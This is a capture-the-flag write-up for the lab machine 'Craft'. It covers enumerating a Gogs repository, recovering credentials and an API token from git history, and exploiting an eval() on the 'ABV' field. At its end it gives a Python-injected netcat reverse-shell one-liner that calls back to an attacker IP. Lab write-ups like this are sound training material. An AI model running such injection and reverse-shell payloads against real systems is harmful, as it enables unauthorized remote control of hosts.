### Hostnames:
  - craft.htb
  - api.craft.htb
  - gogs.craft.htb

#### craft.htb
![image](https://user-images.githubusercontent.com/83878909/229785263-b8557a69-60bd-4672-b9d2-5c440e5dffaf.png)
#### api.craft.htb
![image](https://user-images.githubusercontent.com/83878909/229785634-53d5e3c3-0752-4f35-9e47-a40722a79b66.png)
#### gogs.craft.htb
![image](https://user-images.githubusercontent.com/83878909/229786593-c39dacb7-8254-492e-8b7f-26084699fa89.png)

---

## API
  - Download API: `git -c http.sslVerify=false clone https://gogs.craft.htb/Craft/craft-api.git` 
![image](https://user-images.githubusercontent.com/83878909/229787370-7ecc2abc-4ed1-4f68-b5b4-823ce6c7ebe9.png)
![image](https://user-images.githubusercontent.com/83878909/229789315-f08bc382-7631-42f4-b909-99cfab95d2fa.png)
  - Open Issues
![image](https://user-images.githubusercontent.com/83878909/229787795-a9a9a515-bbe0-4a7a-8143-899f239badca.png)
  - API Token (JWT): `X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw`
  - Commit: `c414b160578943acfe2e158e89409623f41da4c6`
  ![image](https://user-images.githubusercontent.com/83878909/229793366-7d0c7921-d016-4b9d-ad29-10318ed962f5.png)
  - Closed Issues
![image](https://user-images.githubusercontent.com/83878909/229793811-f7d3319b-d5ed-4503-9378-ea8e6aa9bc63.png)
  - Commit: `4fd8dbf8422cbf28f8ec96af54f16891dfdd7b95` redirects to a 404.

---

### Analyse the GIT repository
  - Git Harvesting `git log`
![image](https://user-images.githubusercontent.com/83878909/229796816-9e18e237-3d7a-4494-b349-e1cf0782039a.png)
  - File allows to execute raw SQL commands
![image](https://user-images.githubusercontent.com/83878909/229797644-c3e67d34-fd40-4ffb-9d37-84e03f59da4e.png)
  - Credentials: `dinesh:4aUh0A8PbVJxgd`
![image](https://user-images.githubusercontent.com/83878909/229798129-c456bc2c-1f02-4953-b143-93a4fdb141c3.png)
  - Test Script - commit `c414b160578943acfe2e158e89409623f41da4c6`
![image](https://user-images.githubusercontent.com/83878909/229799067-a2b83b1c-5d32-424a-a2be-573d9c05664e.png)
  - Add found credentials to `test.py` and execute.
![image](https://user-images.githubusercontent.com/83878909/229805482-281bbb46-bf7f-4987-b4d8-4ea5a0853a0f.png)
  - The cript confirms the credentials and authenticates the token as valid.
![image](https://user-images.githubusercontent.com/83878909/229806180-05eed04d-1485-4e15-89d1-473a8c54dfb4.png)
  - Find an execution point in the script which allows to execute commands (Commit: `c414b160578943acfe2e158e89409623f41da4c6`). An eval function executes the 'ABV' value. Inject command using ABV.
![image](https://user-images.githubusercontent.com/83878909/229810365-f5c26d85-6436-48f8-818b-948ec5db7de2.png)
  - Executing the script now sends an ICMP request.
![image](https://user-images.githubusercontent.com/83878909/229810078-4f602a4e-a411-4154-9e97-0509a2f1ab9a.png)
  - Modify the script and embed a python reverse shell.
```CSS
"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f')"
```
![image](https://user-images.githubusercontent.com/83878909/229831739-157a6b8e-0edf-454f-92d6-afa0de1550c7.png)



